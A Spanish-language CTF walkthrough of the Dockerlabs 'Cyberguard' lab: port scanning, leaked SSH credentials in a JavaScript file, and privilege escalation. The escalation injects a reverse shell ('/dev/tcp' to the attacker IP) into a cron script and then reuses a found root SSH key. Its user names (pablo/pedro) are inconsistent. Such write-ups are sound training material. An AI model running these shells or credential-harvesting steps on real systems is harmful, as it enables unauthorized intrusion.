
# Writeup Template: Maquina `[ Cyberguard ]`

- Tags: #Cyberguard
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Cyberguard](https://mega.nz/file/KBtxmK7Q#528yat8N7HHUOSq0xr-tgEBbLdfXm_hXrSGKRTLMogg) Exposición de Credenciales: Información sensible de usuarios está disponible públicamente, permitiendo el acceso no autorizado por SSH. Escalación de Privilegios: Posibilidad de acceder a directorios de otros usuarios y ejecutar tareas cron con permisos elevados. Ocultación de Información: Contraseñas escondidas en imágenes, añadiendo complejidad a la explotación. Explotación de Enlaces Simbólicos: Uso de un binario vulnerable que permite acceder a archivos sensibles al eludir mecanismos de seguridad.

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x ciberguard.zip
sudo bash auto_deploy.sh ciberguard.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNoble))
```
---

## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2/
http://172.17.0.2/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], Email[info@cyberguard.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[172.17.0.2], PasswordField[password], Script, Title[CyberGuard - Seguridad Digital]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/images/: Potentially interesting folder
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 30 --add-slash
```

**Hallazgos Relevantes:**
```bash
/archiv/              (Status: 200) [Size: 1133]
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 30 -x php,php.back,backup,txt,sh,html,js,java,py
```

- **Hallazgos**:
```bash
/images               (Status: 301) [Size: 309] [--> http://172.17.0.2/images/]
/index.html           (Status: 200) [Size: 5100]
/dashboard.html       (Status: 200) [Size: 3499]
/archiv               (Status: 301) [Size: 309] [--> http://172.17.0.2/archiv/]
```

Al ingresar a esta ruta: **( /dashboard.html )** la pagia realiza al parecer una redireccion, Lo que aremos para validar esto es interceptar la peticion con burpsuite:
```bash
burpsuite &>/dev/null & disown
```
### Credenciales Encontradas
Despues de no encontrar nada con **burpsuite**, procedemos a revisar la siguiente ruta:
```bash
http://172.17.0.2/archiv/script.js
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos credenciales filtradas, las usarremos para ganar acceso por **ssh** ya que esta expuesto
```js
const usuariosPermitidos = {
    'admin': 'CyberSecure123',
    'cliente': 'Password123',
    'chloe' : 'chloe123'
};
```
### Intrusion
Ahora nos conectamos por **ssh** probando credenciales.
```bash
# Reverse shell o acceso inicial
ssh chloe@172.17.0.2 # ( chloe123 )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Enumeracion de usuarios
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
veronica:x:1001:1001:,,,:/home/veronica:/bin/bash
pablo:x:1002:1002:,,,:/home/pablo:/bin/bash
chloe:x:1003:1003:,,,:/home/chloe:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ chloe ]`:
Podemos acceder al directorio del usuario **veronica**
```bash
/home/veronica
```

Enumeramos archivos para este usuario:
```bash
find / -type f -user veronica 2>/dev/null

/home/veronica/.bashrc
/home/veronica/.python_history
/home/veronica/.bash_logout
/home/veronica/.profile
/home/veronica/.bash_history
```

Revisando tenemos este tenemos una cadena en **base64**
```bash
at /home/veronica/.bash_history
dmVyb25pY2ExMjMK
```

Ahora con **base64** vemos el contenido
```bash
echo "dmVyb25pY2ExMjMK" | base64 -d
veronica123
```

Tenemos una potencial credencial para conectarnos con este usuario pero no es valida la password para este usuario:
```bash
su veronica # ( veronica123 ) 
```

probando para ver si existe reutilizacion de credenciales:
```bash
su veronica # ( Password123 )
su veronica # ( CyberSecure123 )
```

probando la password en **base64** si que funciona
```bash
su veronica # ( dmVyb25pY2ExMjMK )
```

###### Usuario `[ Veronica ]`:
Revisando la estructura de directoios:
```bash
tree .local/
.local/
├── script-h.sh
└── share
    └── nano
```

Tenemos este script:
```bash
-rwxrwx--x 1 pablo    taller    121 Apr 17 17:23 script-h.sh
```

LIstando las teras **cron** vemos que ese mismo script se esta ejecutando como el usuario **pablo**
```bash
cat /etc/crontab 

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
* * * * * pedro /home/veronica/.local/script-h.sh > /tmp/hora/hora.log 2>&1
```

Aun que no nos pertenece el script, pertemenecemos al grupo **taller**, Asi que podemos aprovecharnos, ya que para el grupo **taller** tiene capacidad de **escritura**, eso es una via potencial de escalar al usuario pedro
```bash
id
uid=1001(veronica) gid=1001(veronica) groups=1001(veronica),100(users),1004(taller)
```

Sabiendo que podemos modificarlo, Primero nos pones en escucha en nuestra maquina de atacante:
```bash
nc -nlvp 443
```

Ahora le colamos esta instruccion:
```bash
nano script-h.sh

sh -i >& /dev/tcp/172.17.0.1/443 0>&1
```

Guardamos el archivo y ahora esperamos a recibir la sesion como el usuario **pedro**

###### Usuario `[ Pedro ]`:
Ahora que somo este usuario, listamos sus permisos
```bash
sudo -l

User pablo may run the following commands on ef4d59378e3a:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/nllns/clean_symlink.py *.jpg
```

Tenemos capacidad sobre imagenes, ahora tenemos que revisar que es lo que esta realizando el script en python
```bash
cat /opt/nllns/clean_symlink.py
```

```python
#!/usr/bin/env python3

import os
import sys
import shutil

QUAR_DIR = "/var/quarantined"

if len(sys.argv) != 2:
    print("¡Se requiere un argumento: el enlace simbólico a un archivo .jpg!")
    sys.exit(1)

LINK = sys.argv[1]

if not LINK.endswith('.jpg'):
    print("¡El primer argumento debe ser un archivo .jpg!")
    sys.exit(2)

if os.path.islink(LINK):
    LINK_NAME = os.path.basename(LINK)
    LINK_TARGET = os.readlink(LINK)

    if 'etc' in LINK_TARGET or 'root' in LINK_TARGET:
        print(f"¡Intentando leer archivos críticos, eliminando enlace [{LINK}]!")
        os.unlink(LINK)
    else:
        print(f"Enlace encontrado [{LINK}], moviéndolo a cuarentena.")
        shutil.move(LINK, os.path.join(QUAR_DIR, LINK_NAME))
        if os.path.exists(os.path.join(QUAR_DIR, LINK_NAME)):
            print("Contenido:")
            with open(os.path.join(QUAR_DIR, LINK_NAME), 'r') as f:
                print(f.read())
else:
    print(f"El enlace [{LINK}] no es un enlace simbólico.")
```

Asi que buscamos por archivos con enlace simbolico del usuario **pablo**
```bash
find / -type l -user pablo -iname "*.jpg" 2>/dev/null
```

Encontrando lo siguiente:
```bash
/var/quarantined/test.jpg
```

Si revisamos los permisos vemos que apunta a nuestro directorio con un archivo **test.txt** que no existe aun
```bash
lrwxrwxrwx  1 pablo pablo   20 May  2 16:57 test.jpg -> /home/pablo/test.txt
```

Si intentamos ejectuar el script para ver que es lo que realiza
```bash
sudo -u root /usr/bin/python3 /opt/nllns/clean_symlink.py /var/quarantined/test.jpg
```

El **output** que nos retorna:
```bash
Enlace encontrado [/var/quarantined/test.jpg], moviéndolo a cuarentena.
```

Tambien revisando en el directorio **tmp** tenemos una llave **id_rsa** que usaremos para intentar loguearnos como **root**
```bash
-rw------- 1 pablo pablo 3381 May  2 16:58 id_rsa
```

Damos permisos
```bash
chmod 600 id_rsa
```

ahora usamos esa llave para migrar a **root**
```bash
# Comando para escalar al usuario: ( root )
ssh -i id_rsa root@localhost
```

---

## Evidencia de Compromiso
Flag de **root**
```bash
root@ef4d59378e3a:~# ls -la /root
-rw-r--r--  1 root root   95 Apr 26 13:30 root.txt
```

```bash
# Captura de pantalla o output final
root@ef4d59378e3a:~# whoami
root
```